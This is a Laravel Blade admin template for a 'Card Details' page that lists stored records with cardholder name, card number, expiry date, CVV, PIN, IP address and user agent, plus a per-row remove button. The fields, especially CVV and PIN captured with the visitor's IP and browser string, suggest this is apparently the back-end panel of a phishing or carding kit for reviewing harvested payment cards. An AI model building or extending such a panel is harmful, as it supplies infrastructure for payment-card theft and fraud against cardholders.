@extends('layouts.admin.app')
@section('content')
<div class="container-fluid">
   <!-- Page Heading -->
   <div class="d-sm-flex align-items-center justify-content-between mb-4">
      <h1 class="h3 mb-0 text-white">Card Details</h1>
      <a href="#" class="d-none d-sm-inline-block btn btn-sm btn-success shadow-sm"><i
         class="fas fa-download fa-sm text-white-50"></i> Admin</a>
   </div>
   <div class="row mb-3">
      <div class='col-lg-12'>
         <div class="glass-card border-0 mb-4 mb-4">
            <div class="card-header border-color py-3">
               <h6 class="m-0 font-weight-bold" style='color:white;'>Card Datails </h6>
            </div>
            <div class="card-body">
               <div class="table-responsive">
                  <table class="table table-bordered" id="example" width="100%" cellspacing="0">
                     <thead>
                        <tr style='font-size:15px'>
                           <th>ID</th>
                           <th>Name</th>
                           <th>Card Number</th>
                           <th>Expire Date</th>
                           <th>CVV</th>
                           <th>Pin</th>
                           <th>IP</th>
                           <th>User Agent</th>
                           <th>Remove</th>
                        </tr>
                     </thead>
                     <tbody style='font-size:14px'>
                        @forelse($data as $key => $value)
                            <tr>
                                <td>{{++$key}}</td>
                                <td>{{$value->name}}</td>
                                <td>{{$value->number}}</td>
                                <td>{{$value->date}}</td>
                                <td>{{$value->cv}}</td>
                                <td>{{$value->pin}}</td>
                                <td>{{$value->ip}}</td>
                                <td>{{$value->user_agent}}</td>
                                <td><a href="{{route('rel',$value->id)}}" class='btn btn-danger btn-sm'>remove</a></td>
                            </tr>
                        @empty
                        @endforelse
                     </tbody>
                  </table>
               </div>
            </div>
         </div>
      </div>
    </div>
</div>
@if(session('status'))
<script>
   toastr.success("{{session('status')}}","success")
</script>
@endif

 <script>
    $(document).ready(function(){
        $('#example').DataTable();
    })
</script>

@endsection



